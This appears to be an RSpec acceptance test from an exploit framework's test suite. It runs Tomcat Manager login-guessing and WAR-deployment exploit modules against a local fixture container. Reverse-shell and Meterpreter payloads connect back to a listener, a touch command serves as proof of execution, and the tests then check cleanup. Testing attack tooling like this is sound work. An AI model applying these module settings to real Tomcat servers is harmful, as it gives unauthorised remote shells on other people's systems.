require 'acceptance_spec_helper'
require 'net/http'

RSpec.describe 'Tomcat Manager module targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  java_spawn = Integer(ENV.fetch('TOMCAT_JAVA_SPAWN', '0'), 10)
  raise ArgumentError, 'TOMCAT_JAVA_SPAWN must be 0 or 2' unless [0, 2].include?(java_spawn)

  before do
    response = manager_request('/manager/text/serverinfo')
    expect(response.code).to eq('200')
    expect(response.body).to include('Tomcat/9.0.123', 'OS Name: [Linux]')
    # Keep repeated preflights from locking the real fixture account in Tomcat's
    # default LockOutRealm; the individual negative cases still test its password.
    expect(manager_request('/manager/html', username: 'module-target-unknown-user', password: 'wrong-password').code).to eq('401')
  end

  it 'finds one valid Manager credential' do
    output = run_target_module('auxiliary/scanner/http/tomcat_mgr_login', 'tomcat', login_options('tomcat'))
    expect(output).to include('Login Successful: tomcat:tomcat')
  end

  it 'rejects one invalid Manager credential' do
    output = run_target_module('auxiliary/scanner/http/tomcat_mgr_login', 'tomcat', login_options('wrong-password'), allow_errors: true)
    expect(output).to include('LOGIN FAILED: tomcat:wrong-password')
    expect(output).not_to include('Login Successful')
  end

  {
    'tomcat_mgr_upload' => { 'TARGETURI' => '/manager', 'TARGET' => 0 },
    'tomcat_mgr_deploy' => { 'PATH' => '/manager/text', 'TARGET' => 1 }
  }.each do |name, options|
    context name do
      let(:fullname) { "exploit/multi/http/#{name}" }
      let(:credentials) { { 'HttpUsername' => 'tomcat', 'HttpPassword' => 'tomcat' } }

      it 'recognizes an authenticated Manager' do
        output = run_target_module(fullname, 'tomcat', options.merge(credentials), action: 'check')
        expect(output).to include('The target appears to be vulnerable')
      end

      it 'does not report invalid credentials as an exploitable Manager' do
        output = run_target_module(fullname, 'tomcat', options.merge(credentials).merge('HttpPassword' => 'wrong-password'), action: 'check', allow_errors: true)
        expect(output).to include('Server rejected the provided credentials')
        expect(output).not_to include('The target appears to be vulnerable')
      end

      it 'executes a Linux x86 payload twice and removes deployments and temporary executables' do
        original_apps = deployed_apps
        original_files = deployment_files
        original_temporary_files = temporary_files
        2.times do
          proof_path = '/tmp/module-target-executable-proof'
          target_exec('tomcat', 'test', '!', '-e', proof_path)
          output = run_target_module(fullname, 'tomcat', options.merge(credentials).merge(
            'TARGET' => name == 'tomcat_mgr_upload' ? 2 : 3,
            'PAYLOAD' => 'linux/x86/exec', 'CMD' => "/usr/bin/touch #{proof_path}",
            'DisablePayloadHandler' => true, 'WfsDelay' => 0
          ))
          expect(output).not_to include('session opened')
          wait_for_expect(20, 0.1) do
            native = target_exec('tomcat', 'sh', '-c', "if test -f #{proof_path}; then echo executable-proof; fi")
            expect(native.strip).to eq('executable-proof')
          end
          target_exec('tomcat', 'rm', '-f', proof_path)
          expect(deployed_apps).to eq(original_apps)
          expect(deployment_files).to eq(original_files)
          expect(temporary_files).to eq(original_temporary_files)
        end
      end

      targets = name == 'tomcat_mgr_deploy' ? [0, 1] : [0]
      targets.product(%w[java/jsp_shell_reverse_tcp java/meterpreter/reverse_tcp]).each do |target, payload|
        payload_description = payload.include?('meterpreter') ? "#{payload} (Spawn=#{java_spawn})" : payload
        it "opens #{payload_description} sessions twice with target #{target} and removes each deployment" do
          original_apps = deployed_apps
          original_files = deployment_files
          payload_options = payload.include?('meterpreter') ? { 'Spawn' => java_spawn } : {}
          2.times do
            proof_path = '/tmp/module-target-session-proof'
            target_exec('tomcat', 'rm', '-f', proof_path)
            target_exec('tomcat', 'test', '!', '-e', proof_path)
            output = run_target_module(fullname, 'tomcat', options.merge(credentials).merge(payload_options).merge(
              'TARGET' => target, 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 10, 'DisablePayloadHandler' => false
            ), action: 'run -z')
            session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
            expect(session_id).not_to be_nil, output
            command = payload.include?('meterpreter') ? "execute -f /usr/bin/touch -a #{proof_path}" : "/usr/bin/touch #{proof_path}"
            flag = payload.include?('meterpreter') ? '-C' : '-c'
            proof = console_command("sessions -i #{session_id} #{flag} #{command.inspect}")
            expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
            wait_for_expect(20, 0.1) do
              native = target_exec('tomcat', 'sh', '-c', "if test -f #{proof_path}; then echo session-proof; fi")
              expect(native.strip).to eq('session-proof')
            end
            # Kill the live JVM payload before the next run, then verify that the
            # Manager and the filesystem both agree undeployment completed.
            console_command('sessions -K')
            target_exec('tomcat', 'rm', '-f', proof_path)
            expect(deployed_apps).to eq(original_apps)
            expect(deployment_files).to eq(original_files)
          end
        end
      end
    end
  end

  def deployment_files
    target_exec('tomcat', 'find', '/usr/local/tomcat/webapps', '-mindepth', '1', '-maxdepth', '1', '-printf', '%f\n').lines.sort
  end

  def temporary_files
    target_exec('tomcat', 'find', '/tmp', '-mindepth', '1', '-maxdepth', '1', '-type', 'f', '-printf', '%f\n').lines.sort
  end

  def deployed_apps
    response = manager_request('/manager/text/list')
    expect(response.code).to eq('200')
    expect(response.body).to start_with('OK - Listed applications')
    # Manager sessions legitimately change as its HTML app issues CSRF tokens.
    response.body.lines.drop(1).map do |line|
      path, state, _sessions, base = line.strip.split(':', 4)
      [path, state, base]
    end.sort
  end

  def manager_request(path, username: 'tomcat', password: 'tomcat')
    endpoint = target_endpoint('tomcat')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 3
    http.read_timeout = 3
    request = Net::HTTP::Get.new(path)
    request.basic_auth(username, password)
    http.request(request)
  end

  def login_options(password)
    {
      'USERNAME' => 'tomcat', 'PASSWORD' => password, 'TARGETURI' => '/manager/html',
      'USERPASS_FILE' => nil, 'USER_FILE' => nil, 'PASS_FILE' => nil,
      'BLANK_PASSWORDS' => false, 'USER_AS_PASS' => false, 'STOP_ON_SUCCESS' => true
    }
  end
end
